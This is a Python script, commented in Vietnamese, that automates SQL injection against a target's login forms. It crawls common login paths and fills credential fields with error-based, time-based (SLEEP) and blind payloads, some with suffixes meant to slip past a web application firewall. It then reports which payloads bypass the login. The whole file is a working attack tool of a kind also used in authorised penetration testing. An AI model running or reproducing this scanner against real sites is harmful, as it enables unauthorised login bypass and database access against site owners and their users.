import time
import signal
import sys
import logging
from playwright.sync_api import sync_playwright, Playwright
from playwright._impl._errors import TimeoutError
import random
import itertools
from colorama import init, Fore, Style
from urllib.parse import urlparse

# Khởi tạo colorama
init()

# Thiết lập logging
logging.basicConfig(filename='sqli_scan.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Danh sách payloads (đã thay thế CONVERT cho MySQL)
ERROR_BASED_PAYLOADS = [
    "' OR '1'='1", "admin' OR 1=1 ", "' OR 1=1 -- "#, "' OR 1=1 #", "admin' OR '1'='1",
    #"1' UNION SELECT NULL, NULL -- ", "' AND 1=1 /*", "' OR 1=1; --",
    #"' OR 'a'='a", "' OR 1=1 -- -", "' OR 1=1 # -",
    #"' OR 1=CAST(@@version AS SIGNED) -- ", "' UNION SELECT NULL, NULL, NULL -- "  # Thay CONVERT bằng CAST cho MySQL
]

# Danh sách payloads time-based (dùng SLEEP cho MySQL)
TIME_BASED_PAYLOADS = [
    "' AND SLEEP(5) -- ", "' OR SLEEP(5) -- ",
    #"' AND IF(1=1, SLEEP(5), 0) -- ", "' OR IF(1=1, SLEEP(5), 0) -- ",
#] + [
    #f"' AND SLEEP({i}) -- " for i in range(1, 11)
#] + [
   # f"' OR SLEEP({i}) -- " for i in range(1, 11)
]

BLIND_SQLI_PAYLOADS = [
    "' AND 1=1", "' AND 1=2", "' AND SUBSTRING((SELECT DATABASE()), 1, 1)='a'",
    #"' AND (SELECT COUNT(*) FROM users)=1", "' AND (SELECT 1)=1",
    #"' AND (SELECT 1)=2", "' AND EXISTS(SELECT * FROM users)",
    #"' AND NOT EXISTS(SELECT * FROM users WHERE id=1)",
] #+ [
    #f"' AND SUBSTRING((SELECT @@{var}), 1, 1)='a' -- " for var in ["version", "servername", "database"]
#]

# Biến thể WAF bypass
WAF_BYPASS_VARIANTS = [
    "", " -- ", " #", " /*", " */", " AND ", " OR ", " SLEEP("
]

# Tạo danh sách payloads với biến thể WAF bypass mà không làm xáo trộn thứ tự
def generate_payloads_with_waf_variants(payloads):
    result = []
    for payload in payloads:
        for variant in WAF_BYPASS_VARIANTS:
            result.append(payload + variant)
    return result

# Tạo payloads theo thứ tự
ERROR_BASED_PAYLOADS = generate_payloads_with_waf_variants(ERROR_BASED_PAYLOADS)
TIME_BASED_PAYLOADS = generate_payloads_with_waf_variants(TIME_BASED_PAYLOADS)
BLIND_SQLI_PAYLOADS = generate_payloads_with_waf_variants(BLIND_SQLI_PAYLOADS)

# Kết hợp payloads theo thứ tự: error-based → time-based → blind
SQLI_PAYLOADS = ERROR_BASED_PAYLOADS + TIME_BASED_PAYLOADS + BLIND_SQLI_PAYLOADS
while len(SQLI_PAYLOADS) < 200:
    SQLI_PAYLOADS.append(f"' AND SLEEP({random.randint(1, 10)}) -- {random.choice(WAF_BYPASS_VARIANTS)}")
SQLI_PAYLOADS = SQLI_PAYLOADS[:200]  # Giới hạn ở 200 payloads

# Các path liên quan đến đăng nhập thành công
SUCCESSFUL_PATHS = ["/userinfo.php", "/user", "/account", "/profile"]

# Các dấu hiệu bị WAF chặn
WAF_INDICATORS = ["403"]

# Từ khóa để xác định lỗi syntax trong nội dung phản hồi
ERROR_INDICATORS = ["error in your SQL syntax", "SQL error", "mysql_fetch", "mysql_num_rows"]

# Từ khóa để xác định các trường liên quan đến credentials
CREDENTIAL_KEYWORDS = {
    "username": ["username", "uname", "user", "login", "name", "usr", "account", "id", "email"],
    "password": ["password", "pass", "pwd", "pw", "passwd", "secret"],
    "email": ["email", "mail", "e-mail"]
}

# Từ khóa để xác định nút submit
SUBMIT_BUTTON_KEYWORDS = [
    "login", "signin", "submit", "log in", "sign in", "enter", "access"
]

# Biến toàn cục
stop_scanning = False
successful_payloads = []

# Xử lý Ctrl+C
def signal_handler(sig, frame):
    global stop_scanning
    print("\n[!] Stopping scan...")
    stop_scanning = True
    if successful_payloads:
        with open("sqli_results.txt", "a") as f:
            for result in successful_payloads:
                f.write(str(result) + "\n")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# Hàm quét path ban đầu
def scan_initial_paths(target):
    valid_paths = []
    print(f"\n[*] Scanning initial paths on {target}...")
    
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(headless=True)
        context = browser.new_context(ignore_https_errors=True)
        page = context.new_page()

        try:
            page.goto(target, timeout=10000)
            page.wait_for_load_state("domcontentloaded", timeout=10000)
            default_content = page.content()
            print(f"[*] Default content loaded from {target}: {default_content[:200]}...")
        except TimeoutError:
            print(f"[!] Timeout loading default content from {target}")
            browser.close()
            return valid_paths

        login_paths = ["/", "/login", "/login.php", "/signin", "/auth"]
        for path in login_paths:
            full_url = f"{target.rstrip('/')}{path}"
            try:
                page.goto(full_url, timeout=10000)
                page.wait_for_load_state("domcontentloaded", timeout=10000)
                if page.query_selector("form") or any(
                    page.query_selector(f"input[name*='{keyword}']") 
                    for keyword in itertools.chain(*CREDENTIAL_KEYWORDS.values())
                ):
                    print(f"[+] Found login path: {path}")
                    valid_paths.append(full_url)
            except TimeoutError:
                print(f"[-] Timeout or inaccessible: {path}")

        browser.close()
    return valid_paths

# Hàm xác định các trường liên quan đến credentials
def identify_credential_fields(page):
    credential_fields = {"username": None, "password": None, "email": None}
    try:
        inputs = page.query_selector_all("input")
        print(f"[*] Found {len(inputs)} input fields on the page.")
        for input_field in inputs:
            name = input_field.get_attribute("name") or ""
            input_type = input_field.get_attribute("type") or ""
            name_lower = name.lower()
            type_lower = input_type.lower()
            for field_type, keywords in CREDENTIAL_KEYWORDS.items():
                for keyword in keywords:
                    if keyword in name_lower and (field_type != "password" or type_lower == "password") and (field_type != "email" or type_lower == "email"):
                        selector = f"input[name='{name}']"
                        credential_fields[field_type] = selector
                        print(f"[+] Identified {field_type} field: {selector}")
                        break
    except Exception as e:
        print(f"[!] Error identifying credential fields: {e}")
    return credential_fields

# Hàm xác định nút submit
def identify_submit_button(page):
    try:
        for keyword in SUBMIT_BUTTON_KEYWORDS:
            selector = f"button[type='submit'], input[type='submit'][value*='{keyword.lower()}']"
            button = page.query_selector(selector)
            if button and button.is_visible() and button.is_enabled():
                print(f"[+] Identified submit button: {selector}")
                return selector
        print(f"[!] No submit button found with known keywords.")
        return None
    except Exception as e:
        print(f"[!] Error identifying submit button: {e}")
        return None

# Hàm kiểm tra SQLi trên form
def exploit_sqli(playwright, url):
    global stop_scanning
    browser = None
    results = []
    try:
        browser = playwright.chromium.launch(headless=True)
        context = browser.new_context(ignore_https_errors=True)
        page = context.new_page()

        last_response = None
        def handle_response(response):
            nonlocal last_response
            last_response = response

        page.on("response", handle_response)

        for attempt in range(3):
            try:
                page.goto(url, timeout=10000)
                page.wait_for_load_state("domcontentloaded", timeout=10000)
                break
            except TimeoutError:
                if attempt == 2:
                    print(f"[!] Failed to load {url} after 3 attempts, skipping...")
                    return []
                time.sleep(1)

        credential_fields = identify_credential_fields(page)
        if not any(credential_fields.values()):
            print(f"[!] No credential-related fields found on {url}. Skipping...")
            return []

        submit_selector = identify_submit_button(page)
        if not submit_selector:
            print(f"[!] No submit button found on {url}. Skipping...")
            return []

        print(f"[*] Testing {len(SQLI_PAYLOADS)} payloads on all fields...")
        for field_type, selector in credential_fields.items():
            if not selector:
                continue
            print(f"[*] Testing all payloads on {field_type} field: {selector} (Field type: {field_type})")
            for payload_type, payloads, color in [
                ("Error-based", ERROR_BASED_PAYLOADS, Fore.RED),
                ("Time-based", TIME_BASED_PAYLOADS, Fore.YELLOW),
                ("Blind SQLi", BLIND_SQLI_PAYLOADS, Fore.CYAN)
            ]:
                for payload in payloads:
                    if stop_scanning:
                        break
                    print(f"[*] Testing {payload_type} payload: {color}{payload}{Style.RESET_ALL}")
                    try:
                        page.goto(url, timeout=10000)
                        page.wait_for_load_state("domcontentloaded", timeout=10000)
                        page.fill(selector, payload)

                        # Điền password123 vào trường password nếu tồn tại
                        if "password" in credential_fields and credential_fields["password"]:
                            page.fill(credential_fields["password"], "password123")

                        submit_button = page.wait_for_selector(submit_selector, state="visible", timeout=5000)
                        if not submit_button or not submit_button.is_enabled():
                            print(f"[!] Submit button {submit_selector} not visible or enabled for {color}{payload}{Style.RESET_ALL}")
                            continue

                        start_time = time.time()
                        submit_button.click()
                        # Chỉ chờ redirect, không cần render nội dung
                        page.wait_for_load_state("domcontentloaded", timeout=10000)
                        elapsed_time = time.time() - start_time

                        # Debug: In URL sau khi submit
                        current_url = page.url
                        print(f"[DEBUG] URL after submit: {current_url}")
                        # Lấy phần path từ URL để so sánh
                        parsed_url = urlparse(current_url)
                        current_path = parsed_url.path.lower().strip()
                        print(f"[DEBUG] Parsed path: {current_path}")
                        # Debug: Kiểm tra điều kiện so sánh
                        path_match = any(path == current_path for path in SUCCESSFUL_PATHS)
                        print(f"[DEBUG] Path match result: {path_match} (Comparing {current_path} with {SUCCESSFUL_PATHS})")
                        status = last_response.status if last_response else 200

                        # Khởi tạo biến is_successful
                        is_successful = False
                        print(f"[DEBUG] Is successful before check: {is_successful}")

                        if status == 403 or "403" in str(status):
                            print(f"[-] WAF detected with {color}{payload}{Style.RESET_ALL} (Status: {status})")
                            continue

                        # Kiểm tra nội dung phản hồi để phát hiện lỗi syntax
                        page_content = page.content().lower()
                        has_syntax_error = any(error_indicator in page_content for error_indicator in ERROR_INDICATORS)
                        print(f"[DEBUG] Has syntax error in response: {has_syntax_error}")

                        # Kiểm tra path để phát hiện đăng nhập thành công
                        if path_match and not has_syntax_error:  # Chỉ ghi nhận nếu không có lỗi syntax
                            # Dùng màu xanh lá cho payload khi SQLi found
                            result = f"[!!!] SQLi found with {Fore.GREEN}{payload}{Style.RESET_ALL} at {url} (Bypass login, Field: {field_type})"
                            results.append(result)
                            print(result)
                            successful_payloads.append({
                                "type": payload_type, "payload": payload, "url": url, "field": field_type, "method": "Bypass login"
                            })
                            is_successful = True
                            print(f"[DEBUG] Successfully recorded SQLi for {payload}")
                        elif ("SLEEP" in payload) and elapsed_time >= 4 and not has_syntax_error:
                            # Dùng màu xanh lá cho payload khi SQLi found
                            result = f"[!!!] SQLi found with {Fore.GREEN}{payload}{Style.RESET_ALL} at {url} (Time-based, Field: {field_type}) (Response time: {elapsed_time}s)"
                            results.append(result)
                            print(result)
                            successful_payloads.append({
                                "type": "Time-based", "payload": payload, "url": url, "field": field_type, "method": "Time-based"
                            })
                            is_successful = True
                            print(f"[DEBUG] Successfully recorded time-based SQLi for {payload}")
                        else:
                            if has_syntax_error:
                                print(f"[*] Payload {color}{payload}{Style.RESET_ALL} caused a syntax error but redirected to {current_path}")
                            else:
                                print(f"[*] Payload {color}{payload}{Style.RESET_ALL} failed on {url} (Field: {field_type})")

                    except TimeoutError as e:
                        print(f"[!] Timeout with {color}{payload}{Style.RESET_ALL}: {e}")
                        continue
                    except Exception as e:
                        print(f"[!] Error with {color}{payload}{Style.RESET_ALL}: {e}")
                        continue

        return results
    finally:
        if browser:
            browser.close()

# Hàm quét tự động và tổng hợp kết quả
def auto_exploit(target, paths, max_time=300):
    global stop_scanning
    start_time = time.time()
    print(f"\n[*] Starting SQLi scan on {target} (Max time: {max_time}s, Total payloads: {len(SQLI_PAYLOADS)})...")
    all_results = []

    with sync_playwright() as playwright:
        for path in paths:
            if stop_scanning or time.time() - start_time > max_time:
                break
            print(f"\n[*] Testing path: {path}")
            results = exploit_sqli(playwright, path)
            all_results.extend(results)

    if all_results or successful_payloads:
        print("\n[!!!] SQLi Scan Results (Detailed Payload Testing):")
        for result in all_results:
            print(result)

        print("\n[!!!] Successful Payloads Summary:")
        if successful_payloads:
            print(f"{'Type':<15} {'Payload':<40} {'URL':<40} {'Field':<15} {'Method':<15}")
            print("-" * 125)
            for success in successful_payloads:
                print(f"{success['type']:<15} {success['payload']:<40} {success['url']:<40} {success['field']:<15} {success['method']:<15}")
        else:
            print("[!] No successful payloads found.")
        with open("sqli_results.txt", "a") as f:
            for result in all_results:
                f.write(result + "\n")
            if successful_payloads:
                f.write("\n[!!!] Successful Payloads Summary:\n")
                f.write(f"{'Type':<15} {'Payload':<40} {'URL':<40} {'Field':<15} {'Method':<15}\n")
                f.write("-" * 125 + "\n")
                for success in successful_payloads:
                    f.write(f"{success['type']:<15} {success['payload']:<40} {success['url']:<40} {success['field']:<15} {success['method']:<15}\n")
    else:
        print("[!] No SQLi vulnerabilities found.")

# Hàm chính
def main(target):
    """
    Main function to execute SQL injection scanning.
    Args:
        target (str): The URL to scan.
    """
    try:
        print("=== Advanced SQL Injection Scanner ===")
        print(f"Scanning {target} for SQL injection vulnerabilities...")
        
        # Scan for valid paths
        valid_paths = scan_initial_paths(target)

        # Include the base URL in the paths to scan
        if target not in valid_paths:
            valid_paths.insert(0, target)

        if valid_paths:
            print(f"\n[*] Found {len(valid_paths)} login paths: {valid_paths}")
            auto_exploit(target, valid_paths)
        else:
            print("[!] No login paths found. SQLi scan skipped.")

        print("SQLi scan completed!")
    except Exception as e:
        print(f"Error in SQLi_auto: {e}")

if __name__ == "__main__":
    print("=== SQL Injection Scanner ===")
    target = input("Enter target URL to scan for SQLi: ")
    main(target)